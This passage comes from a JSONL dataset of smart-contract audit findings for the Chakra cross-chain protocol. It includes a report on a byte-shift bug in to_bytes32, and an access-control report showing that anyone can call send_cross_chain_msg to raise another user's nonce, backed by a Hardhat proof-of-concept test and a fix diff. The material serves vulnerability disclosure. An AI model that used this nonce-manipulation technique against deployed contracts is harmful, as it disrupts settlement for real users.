mode.\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-154", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 154, "page_start": null, "title": "Incorrect Data Shifting in to_bytes32 Function", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57\n\n\n# Vulnerability details\n\n\n## Impact\n\nThe `to_bytes32` function in `AddressCast.sol` contains a logical error when converting `bytes` to `bytes32`. The function incorrectly right-shifts the input data, which is already left-aligned in Solidity's `bytes` type. This misalignment results in data loss when the input `_addressBytes` length is less than 32 bytes.\n\nThis error stems from a misunderstanding of EVM data alignment. Types such as `bytes` and `bytesX` (where X is 1, 2, ..., 32) are left-aligned in the EVM.\n\n## Proof of Concept\n\nVulnerable code location:\n- [solidity/handler/.../AddressCast.sol](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57)\n\nThe problematic code in the `to_bytes32` function:\n\n```solidity\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n    unchecked {\n        //@audit bytes are already left aligned, this shift is unnecessary\n        uint256 offset = 32 - _addressBytes.length;\n        result = result >> (offset * 8);\n    }\n}\n```\n\nHere, the data in the Bytes32 is arbitrarily right-shifted by `offset * 8` bits. This operation is unnecessary and results in data loss when `_addressBytes` is less than 32 bytes. The correct approach is to directly cast `_addressBytes` to `bytes32` without any shifting.\n\n## Tools Used\n\n- Manual code review\n- Ethereum documentation\n-\n## Recommended Mitigation Steps\n\nRemove the shift operation entirely. The correct implementation should directly cast the input `bytes` to `bytes32` without any shifting. Here's the corrected function:\n\n```diff\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n\n-    unchecked {\n-        uint256 offset = 32 - _addressBytes.length;\n-        result = result >> (offset * 8);\n-    }\n}\n```\n\nThis implementation simply casts `_addressBytes` to `bytes32` without shifting. The Solidity compiler will handle the proper memory layout, ensuring that the bytes are correctly left-aligned in the resulting `bytes32`.\n\n\n## Assessed type\n\nen/de-code\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe `to_bytes32` function in `AddressCast.sol` contains a logical error when converting `bytes` to `bytes32`. The function incorrectly right-shifts the input data, which is already left-aligned in Solidity's `bytes` type. This misalignment results in data loss when the input `_addressBytes` length is less than 32 bytes.\n\nThis error stems from a misunderstanding of EVM data alignment. Types such as `bytes` and `bytesX` (where X is 1, 2, ..., 32) are left-aligned in the EVM.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nRemove the shift operation entirely. The correct implementation should directly cast the input `bytes` to `bytes32` without any shifting. Here's the corrected function:\n\n```diff\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n\n-    unchecked {\n-        uint256 offset = 32 - _addressBytes.length;\n-        result = result >> (offset * 8);\n-    }\n}\n```\n\nThis implementation simply casts `_addressBytes` to `bytes32` without shifting. The Solidity compiler will handle the proper memory layout, ensuring that the bytes are correctly left-aligned in the resulting `bytes32`.\n\n\n## Assessed type\n\nen/de-code\n", "poc_md": "## Proof of Concept\n\nVulnerable code location:\n- [solidity/handler/.../AddressCast.sol](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57)\n\nThe problematic code in the `to_bytes32` function:\n\n```solidity\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n    unchecked {\n        //@audit bytes are already left aligned, this shift is unnecessary\n        uint256 offset = 32 - _addressBytes.length;\n        result = result >> (offset * 8);\n    }\n}\n```\n\nHere, the data in the Bytes32 is arbitrarily right-shifted by `offset * 8` bits. This operation is unnecessary and results in data loss when `_addressBytes` is less than 32 bytes. The correct approach is to directly cast `_addressBytes` to `bytes32` without any shifting.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\n- Manual code review\n- Ethereum documentation\n-\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57\n\n\n# Vulnerability details\n\n\n## Impact\n\nThe `to_bytes32` function in `AddressCast.sol` contains a logical error when converting `bytes` to `bytes32`. The function incorrectly right-shifts the input data, which is already left-aligned in Solidity's `bytes` type. This misalignment results in data loss when the input `_addressBytes` length is less than 32 bytes.\n\nThis error stems from a misunderstanding of EVM data alignment. Types such as `bytes` and `bytesX` (where X is 1, 2, ..., 32) are left-aligned in the EVM.\n\n## Proof of Concept\n\nVulnerable code location:\n- [solidity/handler/.../AddressCast.sol](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57)\n\nThe problematic code in the `to_bytes32` function:\n\n```solidity\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n    unchecked {\n        //@audit bytes are already left aligned, this shift is unnecessary\n        uint256 offset = 32 - _addressBytes.length;\n        result = result >> (offset * 8);\n    }\n}\n```\n\nHere, the data in the Bytes32 is arbitrarily right-shifted by `offset * 8` bits. This operation is unnecessary and results in data loss when `_addressBytes` is less than 32 bytes. The correct approach is to directly cast `_addressBytes` to `bytes32` without any shifting.\n\n## Tools Used\n\n- Manual code review\n- Ethereum documentation\n-\n## Recommended Mitigation Steps\n\nRemove the shift operation entirely. The correct implementation should directly cast the input `bytes` to `bytes32` without any shifting. Here's the corrected function:\n\n```diff\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n\n-    unchecked {\n-        uint256 offset = 32 - _addressBytes.length;\n-        result = result >> (offset * 8);\n-    }\n}\n```\n\nThis implementation simply casts `_addressBytes` to `bytes32` without shifting. The Solidity compiler will handle the proper memory layout, ensuring that the bytes are correctly left-aligned in the resulting `bytes32`.\n\n\n## Assessed type\n\nen/de-code\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57\n\n\n# Vulnerability details\n\n\n## Impact\n\nThe `to_bytes32` function in `AddressCast.sol` contains a logical error when converting `bytes` to `bytes32`. The function incorrectly right-shifts the input data, which is already left-aligned in Solidity's `bytes` type. This misalignment results in data loss when the input `_addressBytes` length is less than 32 bytes.\n\nThis error stems from a misunderstanding of EVM data alignment. Types such as `bytes` and `bytesX` (where X is 1, 2, ..., 32) are left-aligned in the EVM.\n\n## Proof of Concept\n\nVulnerable code location:\n- [solidity/handler/.../AddressCast.sol](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L47-L57)\n\nThe problematic code in the `to_bytes32` function:\n\n```solidity\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n    unchecked {\n        //@audit bytes are already left aligned, this shift is unnecessary\n        uint256 offset = 32 - _addressBytes.length;\n        result = result >> (offset * 8);\n    }\n}\n```\n\nHere, the data in the Bytes32 is arbitrarily right-shifted by `offset * 8` bits. This operation is unnecessary and results in data loss when `_addressBytes` is less than 32 bytes. The correct approach is to directly cast `_addressBytes` to `bytes32` without any shifting.\n\n## Tools Used\n\n- Manual code review\n- Ethereum documentation\n- \n## Recommended Mitigation Steps\n\nRemove the shift operation entirely. The correct implementation should directly cast the input `bytes` to `bytes32` without any shifting. Here's the corrected function:\n\n```diff\nfunction to_bytes32(\n    bytes calldata _addressBytes\n) internal pure returns (bytes32 result) {\n    if (_addressBytes.length > 32) revert AddressCast_InvalidAddress();\n    result = bytes32(_addressBytes);\n\n-    unchecked {\n-        uint256 offset = 32 - _addressBytes.length;\n-        result = result >> (offset * 8);\n-    }\n}\n```\n\nThis implementation simply casts `_addressBytes` to `bytes32` without shifting. The Solidity compiler will handle the proper memory layout, ensuring that the bytes are correctly left-aligned in the resulting `bytes32`.\n\n\n## Assessed type\n\nen/de-code"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-156", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 156, "page_start": null, "title": "Anyone can manipulate user nonce (nonce_manager) in settlement contract", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\n\n\n# Vulnerability details\n\n## Impact\nThere is a problem that Anyone can increase another handler contract nonce (nonce_manager) in settlement contract.\n\nnonce_manager is used to make ```txid```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L122-L133\n```\n        {\n            // Increment nonce for the sender\n            nonce_manager[msg.sender] += 1;\n        }\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\n\n```txid``` is generated using several arguments and the ```nonce_manager[msg.sender]``` value as shown above.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L212-L222\n```\n        emit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n            address(this),\n            to_token,\n            amount,\n            mode\n        );\n```\nThe handler function emits the corresponding ```txid``` value as an event.\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n///Handler code\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L118-L133\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L146-L155\n```\n///Settlement code\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n```\n\nBefore the event emit, the handler function calls ```settlement.send_cross_chain_msg```. The ```send_cross_chain_msg``` function of settlement also creates a ```txid``` and emits an event using this ```txid```.\n\n\nThrough this process, the handler contract and the settlement contract emit the same ```txid``` event.\n\nThe system processes this emitted ```txid``` to handle the task.\n\nHowever, there is a vulnerability that allows anyone to manipulate the ```nonce_manager``` value used when generating ```txid``` in the settlement contract with someone else's ```nonce_manager``` value, which can cause confusion in the system.\n\n\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\n```\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nWhen the ```cross_chain_erc20_settlement``` function is called in the handler contract, a ```txid``` is generated and the ```send_cross_chain_msg``` function of the settlement contract is called.\n\n```\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n```\nIn the ```send_cross_chain_msg``` function of the settlement contract, the ```from_address``` argument is set to the address of the user who called the ```cross_chain_erc20_settlement``` function of the handler set in the handler, the nonce value of the address is increased, and a ```txid``` is generated.\n\nHere, the ```send_cross_chain_msg``` function is defined as external, so it is a function that can be called by outsiders, and since there is no other access control when increasing the nonce of ```from_address``` in ```nonce_manager```, anyone can increase the nonce of a specific user's settlement contract.\n\nThis can cause an imbalance between the handler's nonce and the settlement's nonce, potentially causing system confusion.\n\nAlso, if the same user of another handler calls the ```cross_chain_erc20_settlement``` function, a mismatch between the user nonce of the handler and the settlement will occur.\n\n## Test\n```\n    it('Test Manipulate another settlement contract user nonce', async () => {\n        const [\n            sender,\n            receiver,\n            attacker,\n        ] = await hre.ethers.getSigners();\n        const { tokenInstance, tokenOperator, codecInstance, settlmentInstance, tokenOwner, settlementHandlerInstance, settlementHnadlerOwner, messageLibTestInstance } = await loadFixture(deploySettlementHandlerFixtureMintBurn);\n\n        const senderAddress = await sender.getAddress()\n        const receiverAddress = await receiver.getAddress()\n        const settlementHandlerAddress = await settlementHandlerInstance.getAddress()\n        const totalAmount = 1000000;\n        await tokenInstance.connect(tokenOperator).mint_to(sender, totalAmount);\n\n\n        const toChain = \"dst\"\n        const toHandler = 1\n        const toToken = 1\n        const receiverAddressU256 = hre.ethers.toBigInt(Buffer.from(receiverAddress.slice(2), 'hex'))\n        const amount = 1000\n\n        await tokenInstance.connect(sender).approve(settlementHandlerAddress, 1000)\n\n        const tx = await settlementHandlerInstance.connect(sender).cross_chain_erc20_settlement(\n            toChain,\n            toHandler,\n            toToken,\n            receiverAddressU256,\n            amount\n        )\n        const nonceBefore = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract before attack:\", nonceBefore.toString());\n\n        const payloadType = 5; // Assuming a payload type, e.g., for an ERC20 transfer\n        const payload = \"0x616263\"; // Example payload data (\"abc\" in hex)\n        await(settlmentInstance.connect(attacker).send_cross_chain_msg(\n            toChain,\n            senderAddress, // sender address to target\n            toHandler,\n            payloadType,\n            payload,\n        ));\n        const nonceAfter = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract after attack:\", nonceAfter.toString());\n\n        const handlerNonce = await settlementHandlerInstance.nonce_manager(senderAddress);\n        console.log(\"Handler Contract User Nonce: \", handlerNonce.toString());\n        expect(nonceAfter).to.be.not.equal(handlerNonce);\n\n    });\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/test/ChakraSettlementHandler.ts\nwrite test code in ```ChakraSettlementHandler.ts``` file\n\nThis test code tests whether the sender's (user's) nonce value has been manipulated by the Attacker.\n\n### Test log\n```\nChakraSettlementHandler\n    _ Should work in MintBurn mode (1238ms)\nNonce value in settlement contract before attack: 1\nNonce value in settlement contract after attack: 2\nHandler Contract User Nonce:  1\n```\n\n## Tools Used\nvscode, Manual Review\n\n## Recommended Mitigation Steps\nSet the nonce value in the settlement contract to be managed by ```from_handler```\n\n```\ndiff --git a/solidity/settlement/contracts/BaseSettlement.sol b/solidity/settlement/contracts/BaseSettlement.sol\nindex 7ac72a2..bd2ce00 100644\n--- a/solidity/settlement/contracts/BaseSettlement.sol\n+++ b/solidity/settlement/contracts/BaseSettlement.sol\n@@ -38,7 +38,8 @@ abstract contract BaseSettlement is\n     ISettlementSignatureVerifier public signature_verifier;\n\n     // Mapping for nonce manager and validators\n-    mapping(address => uint256) public nonce_manager;\n+    //mapping(address => uint256) public nonce_manager;\n+    mapping(address => mapping(address => uint256)) public nonce_manager;\n     mapping(address => bool) public chakra_validators;\n     uint256 public validator_count;\n\ndiff --git a/solidity/settlement/contracts/ChakraSettlement.sol b/solidity/settlement/contracts/ChakraSettlement.sol\nindex ad764f2..4c2b0c5 100644\n--- a/solidity/settlement/contracts/ChakraSettlement.sol\n+++ b/solidity/settlement/contracts/ChakraSettlement.sol\n@@ -115,9 +115,10 @@ contract ChakraSettlement is BaseSettlement {\n         PayloadType payload_type,\n         bytes calldata payload\n     ) external {\n-        nonce_manager[from_address] += 1;\n+        // nonce_manager[from_address] += 1;\n\n         address from_handler = msg.sender;\n+        nonce_manager[from_handler][from_address] += 1;\n\n         uint256 txid = uint256(\n             keccak256(\n```\n\nModify nonce_manager as in the code above so that the user's nonce_manager can increase according to the handler.\n\nThis operation prevents an attacker from manipulating someone else's nonce by pretending to be a handler, and also prevents nonce collisions between other normal handlers.\n\n\n## Assessed type\n\nAccess Control\n", "sections": {"description_md": null, "impact_md": "## Impact\nThere is a problem that Anyone can increase another handler contract nonce (nonce_manager) in settlement contract.\n\nnonce_manager is used to make ```txid```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L122-L133\n```\n        {\n            // Increment nonce for the sender\n            nonce_manager[msg.sender] += 1;\n        }\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\n\n```txid``` is generated using several arguments and the ```nonce_manager[msg.sender]``` value as shown above.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L212-L222\n```\n        emit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n            address(this),\n            to_token,\n            amount,\n            mode\n        );\n```\nThe handler function emits the corresponding ```txid``` value as an event.\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n///Handler code\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L118-L133\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L146-L155\n```\n///Settlement code\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n```\n\nBefore the event emit, the handler function calls ```settlement.send_cross_chain_msg```. The ```send_cross_chain_msg``` function of settlement also creates a ```txid``` and emits an event using this ```txid```.\n\n\nThrough this process, the handler contract and the settlement contract emit the same ```txid``` event.\n\nThe system processes this emitted ```txid``` to handle the task.\n\nHowever, there is a vulnerability that allows anyone to manipulate the ```nonce_manager``` value used when generating ```txid``` in the settlement contract with someone else's ```nonce_manager``` value, which can cause confusion in the system.\n", "recommendation_md": "## Recommended Mitigation Steps\nSet the nonce value in the settlement contract to be managed by ```from_handler```\n\n```\ndiff --git a/solidity/settlement/contracts/BaseSettlement.sol b/solidity/settlement/contracts/BaseSettlement.sol\nindex 7ac72a2..bd2ce00 100644\n--- a/solidity/settlement/contracts/BaseSettlement.sol\n+++ b/solidity/settlement/contracts/BaseSettlement.sol\n@@ -38,7 +38,8 @@ abstract contract BaseSettlement is\n     ISettlementSignatureVerifier public signature_verifier;\n\n     // Mapping for nonce manager and validators\n-    mapping(address => uint256) public nonce_manager;\n+    //mapping(address => uint256) public nonce_manager;\n+    mapping(address => mapping(address => uint256)) public nonce_manager;\n     mapping(address => bool) public chakra_validators;\n     uint256 public validator_count;\n\ndiff --git a/solidity/settlement/contracts/ChakraSettlement.sol b/solidity/settlement/contracts/ChakraSettlement.sol\nindex ad764f2..4c2b0c5 100644\n--- a/solidity/settlement/contracts/ChakraSettlement.sol\n+++ b/solidity/settlement/contracts/ChakraSettlement.sol\n@@ -115,9 +115,10 @@ contract ChakraSettlement is BaseSettlement {\n         PayloadType payload_type,\n         bytes calldata payload\n     ) external {\n-        nonce_manager[from_address] += 1;\n+        // nonce_manager[from_address] += 1;\n\n         address from_handler = msg.sender;\n+        nonce_manager[from_handler][from_address] += 1;\n\n         uint256 txid = uint256(\n             keccak256(\n```\n\nModify nonce_manager as in the code above so that the user's nonce_manager can increase according to the handler.\n\nThis operation prevents an attacker from manipulating someone else's nonce by pretending to be a handler, and also prevents nonce collisions between other normal handlers.\n\n\n## Assessed type\n\nAccess Control\n", "poc_md": "## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\n```\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nWhen the ```cross_chain_erc20_settlement``` function is called in the handler contract, a ```txid``` is generated and the ```send_cross_chain_msg``` function of the settlement contract is called.\n\n```\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n```\nIn the ```send_cross_chain_msg``` function of the settlement contract, the ```from_address``` argument is set to the address of the user who called the ```cross_chain_erc20_settlement``` function of the handler set in the handler, the nonce value of the address is increased, and a ```txid``` is generated.\n\nHere, the ```send_cross_chain_msg``` function is defined as external, so it is a function that can be called by outsiders, and since there is no other access control when increasing the nonce of ```from_address``` in ```nonce_manager```, anyone can increase the nonce of a specific user's settlement contract.\n\nThis can cause an imbalance between the handler's nonce and the settlement's nonce, potentially causing system confusion.\n\nAlso, if the same user of another handler calls the ```cross_chain_erc20_settlement``` function, a mismatch between the user nonce of the handler and the settlement will occur.\n\n## Test\n```\n    it('Test Manipulate another settlement contract user nonce', async () => {\n        const [\n            sender,\n            receiver,\n            attacker,\n        ] = await hre.ethers.getSigners();\n        const { tokenInstance, tokenOperator, codecInstance, settlmentInstance, tokenOwner, settlementHandlerInstance, settlementHnadlerOwner, messageLibTestInstance } = await loadFixture(deploySettlementHandlerFixtureMintBurn);\n\n        const senderAddress = await sender.getAddress()\n        const receiverAddress = await receiver.getAddress()\n        const settlementHandlerAddress = await settlementHandlerInstance.getAddress()\n        const totalAmount = 1000000;\n        await tokenInstance.connect(tokenOperator).mint_to(sender, totalAmount);\n\n\n        const toChain = \"dst\"\n        const toHandler = 1\n        const toToken = 1\n        const receiverAddressU256 = hre.ethers.toBigInt(Buffer.from(receiverAddress.slice(2), 'hex'))\n        const amount = 1000\n\n        await tokenInstance.connect(sender).approve(settlementHandlerAddress, 1000)\n\n        const tx = await settlementHandlerInstance.connect(sender).cross_chain_erc20_settlement(\n            toChain,\n            toHandler,\n            toToken,\n            receiverAddressU256,\n            amount\n        )\n        const nonceBefore = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract before attack:\", nonceBefore.toString());\n\n        const payloadType = 5; // Assuming a payload type, e.g., for an ERC20 transfer\n        const payload = \"0x616263\"; // Example payload data (\"abc\" in hex)\n        await(settlmentInstance.connect(attacker).send_cross_chain_msg(\n            toChain,\n            senderAddress, // sender address to target\n            toHandler,\n            payloadType,\n            payload,\n        ));\n        const nonceAfter = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract after attack:\", nonceAfter.toString());\n\n        const handlerNonce = await settlementHandlerInstance.nonce_manager(senderAddress);\n        console.log(\"Handler Contract User Nonce: \", handlerNonce.toString());\n        expect(nonceAfter).to.be.not.equal(handlerNonce);\n\n    });\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/test/ChakraSettlementHandler.ts\nwrite test code in ```ChakraSettlementHandler.ts``` file\n\nThis test code tests whether the sender's (user's) nonce value has been manipulated by the Attacker.\n\n### Test log\n```\nChakraSettlementHandler\n    _ Should work in MintBurn mode (1238ms)\nNonce value in settlement contract before attack: 1\nNonce value in settlement contract after attack: 2\nHandler Contract User Nonce:  1\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nvscode, Manual Review\n", "full_markdown_body": 